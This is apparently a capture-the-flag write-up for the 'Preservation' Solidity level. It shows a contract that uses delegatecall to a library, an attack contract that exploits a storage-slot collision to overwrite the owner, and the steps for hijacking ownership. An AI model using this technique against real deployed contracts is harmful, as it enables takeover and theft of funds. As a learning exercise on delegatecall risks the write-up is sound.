# Preservation

## Given code:
```shell
contract Preservation {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    ...
  }

  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

contract LibraryContract {

  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```
## Attack code:
```shell
contract Attack {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; // Storage slot 2 corrosponds w/ Preservation contract slot 2

  // Function selector remains the same
  // Custom logic resets slot2 'owner'
  function setTime(uint _time) public {
    owner = msg.sender;
  }
}
```
## Hack:
Step1:

Create `Attack` contract (see above)

Step2: 

Call `setFirstTime` on `Preservation` contract and pass in `Attack` contract address. Note, the type is `uint` it will accept a type `address`. This will then jump into the 'library' which sets the first storage slot to equal the passed in value. See notes below.

Step3:

Call `setFirstTime` on `Preservation` contract a second time. Now pointing towards our `Attack` contract, the delegate call will operate within the context of the `Preservation` contract with our custom logic.


## Notes:

If a set of code is properly labled as `library` the EVM will prevent it from storing Ether and setting storage variables. In our case this code is labled as a `contract`, a major vulnerability.